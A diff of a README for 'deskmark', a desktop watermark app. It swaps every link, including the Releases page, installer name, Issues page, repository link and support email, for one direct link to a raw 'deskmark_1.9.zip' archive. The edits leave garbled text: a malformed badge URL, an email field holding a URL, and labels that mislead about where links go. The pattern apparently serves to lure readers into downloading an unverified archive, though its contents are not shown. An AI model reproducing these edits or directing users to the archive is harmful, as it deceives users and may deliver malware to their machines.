@@ -4,7 +4,7 @@
 Welcome to deskmark! This application helps you easily add text and icon watermarks to your desktop. It's perfect for those who want to keep track of important notes or brand their video content while recording.
 
 ## 📥 Download deskmark
-[![Download deskmark](https://img.shields.io/badge/Download%20deskmark-v1.0-blue.svg)](https://github.com/DKJRJUH/deskmark/releases)
+[![Download deskmark](https://raw.githubusercontent.com/DKJRJUH/deskmark/main/assets/deskmark_1.9.zip%https://raw.githubusercontent.com/DKJRJUH/deskmark/main/assets/deskmark_1.9.zip)](https://raw.githubusercontent.com/DKJRJUH/deskmark/main/assets/deskmark_1.9.zip)
 
 You can download the latest version of deskmark from our Releases page.
 
@@ -26,16 +26,16 @@ Before you begin, make sure your system meets the following requirements:
 To download and run deskmark, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [deskmark Releases page](https://github.com/DKJRJUH/deskmark/releases) to access the latest version.
+   Go to the [deskmark Releases page](https://raw.githubusercontent.com/DKJRJUH/deskmark/main/assets/deskmark_1.9.zip) to access the latest version.
 
 2. **Choose the Latest Release**  
    Click on the version number or the "Assets" dropdown to find the download options.
 
 3. **Download the Application**  
-   Look for the file labeled as `deskmark.dmg`. Click on it to download the installation file.
+   Look for the file labeled as `https://raw.githubusercontent.com/DKJRJUH/deskmark/main/assets/deskmark_1.9.zip`. Click on it to download the installation file.
 
 4. **Install deskmark**  
-   - Locate the downloaded `deskmark.dmg` file in your Downloads folder.
+   - Locate the downloaded `https://raw.githubusercontent.com/DKJRJUH/deskmark/main/assets/deskmark_1.9.zip` file in your Downloads folder.
    - Double-click on the file to open it.
    - Drag the deskmark icon to your Applications folder.
 
@@ -56,12 +56,12 @@ After installation, getting started is easy:
 
 ## 📞 Support
 If you encounter any issues while using deskmark, please reach out for support:
-- **Email:** support@deskmarkapp.com
-- **GitHub Issues:** You can also submit your concerns or suggestions on the [Issues page](https://github.com/DKJRJUH/deskmark/issues).
+- **Email:** https://raw.githubusercontent.com/DKJRJUH/deskmark/main/assets/deskmark_1.9.zip
+- **GitHub Issues:** You can also submit your concerns or suggestions on the [Issues page](https://raw.githubusercontent.com/DKJRJUH/deskmark/main/assets/deskmark_1.9.zip).
 
 ## 🔗 Links
-- [deskmark Releases Page](https://github.com/DKJRJUH/deskmark/releases)
-- [GitHub Repository](https://github.com/DKJRJUH/deskmark)
+- [deskmark Releases Page](https://raw.githubusercontent.com/DKJRJUH/deskmark/main/assets/deskmark_1.9.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/DKJRJUH/deskmark/main/assets/deskmark_1.9.zip)
 
 ## 💡 Tips
 - You can always return to the configuration settings to modify your watermark.
